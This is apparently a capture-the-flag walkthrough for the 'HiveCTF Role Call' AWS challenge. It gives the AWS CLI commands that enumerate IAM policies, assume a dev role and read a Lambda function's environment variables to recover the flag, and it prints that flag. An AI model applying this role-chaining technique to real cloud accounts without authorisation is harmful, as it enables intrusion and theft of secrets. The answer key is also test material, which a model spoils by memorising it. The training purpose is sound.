# Challenge 2: Role Call - Walkthrough

**Flag:** `HiveCTF{r0l3_ch41n1ng_f0r_th3_w1n}`

## Prerequisites

Configure the intern credentials in the AWS CLI:

```bash
aws configure --profile hivectf-ch2
# Access Key ID: <from CTFd>
# Secret Access Key: <from CTFd>
# Region: us-east-1
# Output format: json
```

## Step 1: Confirm Identity

Verify who you are:

```bash
aws sts get-caller-identity --profile hivectf-ch2
```

Expected output:

```json
{
    "UserId": "AIDA...",
    "Account": "<ACCOUNT_1_ID>",
    "Arn": "arn:aws:iam::<ACCOUNT_1_ID>:user/hivectf-ch2-intern"
}
```

You are the `hivectf-ch2-intern` user.

## Step 1.5: Discover Your Own Permissions

Before exploring blindly, check what policies are attached to your user:

```bash
aws iam list-user-policies --user-name hivectf-ch2-intern --profile hivectf-ch2
```

This reveals an inline policy. Read it:

```bash
aws iam get-user-policy --user-name hivectf-ch2-intern --policy-name hivectf-ch2-intern-policy --profile hivectf-ch2
```

The policy document shows you can:
- `iam:ListRoles` and `iam:GetRole` on `hivectf-ch2-*` roles
- `sts:AssumeRole` on `hivectf-ch2-dev-role`
- Read your own policies

This tells you exactly where to start -- enumerate roles and assume the dev role.

## Step 2: Enumerate IAM Roles

List roles available in the account (filtered to hivectf-ch2-* by policy):

```bash
aws iam list-roles --profile hivectf-ch2 --query "Roles[?starts_with(RoleName, 'hivectf-ch2')]" --output json
```

This reveals several roles. The interesting one is `hivectf-ch2-dev-role`.

## Step 3: Inspect the Dev Role

Get details on the dev role, including its trust policy:

```bash
aws iam get-role --role-name hivectf-ch2-dev-role --profile hivectf-ch2
```

The trust policy (AssumeRolePolicyDocument) shows that `hivectf-ch2-intern` is allowed to assume this role. This is the key insight.

## Step 4: Assume the Dev Role

Assume the dev role to get temporary credentials:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::<ACCOUNT_1_ID>:role/hivectf-ch2-dev-role \
  --role-session-name ctf-session \
  --profile hivectf-ch2
```

This returns temporary credentials (AccessKeyId, SecretAccessKey, SessionToken). Export them:

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId from output>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from output>
export AWS_SESSION_TOKEN=<SessionToken from output>
```

Alternatively, configure a named profile in `~/.aws/config`:

```ini
[profile hivectf-ch2-dev]
role_arn = arn:aws:iam::<ACCOUNT_1_ID>:role/hivectf-ch2-dev-role
source_profile = hivectf-ch2
region = us-east-1
```

Then use `--profile hivectf-ch2-dev` for subsequent commands.

## Step 5: Verify New Identity

```bash
aws sts get-caller-identity
```

You should now be operating as the dev role.

## Step 5.5: Discover What the Dev Role Can Do

Now that you've assumed the dev role, enumerate its policies to understand what
permissions you have:

```bash
aws iam list-role-policies --role-name hivectf-ch2-dev-role
```

This lists the inline policies attached to the role. Read the policy details:

```bash
aws iam get-role-policy --role-name hivectf-ch2-dev-role --policy-name hivectf-ch2-dev-lambda-policy
```

The policy document reveals:
- `lambda:ListFunctions` on `*`
- `lambda:GetFunctionConfiguration` and `lambda:GetFunction` scoped to `hivectf-ch2-*`

This tells you exactly where to look next -- Lambda functions.

## Step 6: Enumerate Lambda Functions

List Lambda functions:

```bash
aws lambda list-functions --query "Functions[?starts_with(FunctionName, 'hivectf-ch2')].[FunctionName]" --output text
```

Output reveals two functions:

- `hivectf-ch2-internal-processor`
- `hivectf-ch2-public-api`

## Step 7: Inspect Lambda Function Configurations

Check the decoy first (no flag here):

```bash
aws lambda get-function-configuration --function-name hivectf-ch2-public-api
```

Environment variables show `STAGE=production` -- nothing useful.

Now check the internal processor:

```bash
aws lambda get-function-configuration --function-name hivectf-ch2-internal-processor
```

The environment variables section contains:

```json
{
    "Variables": {
        "FLAG": "HiveCTF{r0l3_ch41n1ng_f0r_th3_w1n}",
        "ENVIRONMENT": "internal",
        "SERVICE": "data-processor"
    }
}
```

## Summary of Attack Path

```
hivectf-ch2-intern (IAM user)
    |
    | iam:ListRoles, iam:GetRole
    v
Discover hivectf-ch2-dev-role (trust policy allows intern)
    |
    | sts:AssumeRole
    v
hivectf-ch2-dev-role (IAM role)
    |
    | iam:ListRolePolicies, iam:GetRolePolicy (on own role)
    v
Discover Lambda read permissions on hivectf-ch2-*
    |
    | lambda:ListFunctions, lambda:GetFunctionConfiguration
    v
hivectf-ch2-internal-processor -> ENV: FLAG = HiveCTF{r0l3_ch41n1ng_f0r_th3_w1n}
```

## Concepts Tested

- **IAM enumeration**: listing and inspecting roles
- **Trust policy analysis**: understanding who can assume a role
- **Role chaining / assumption**: using sts:AssumeRole to escalate privileges
- **Lambda inspection**: reading function configurations and environment variables
- **Decoy recognition**: identifying which resource contains the flag
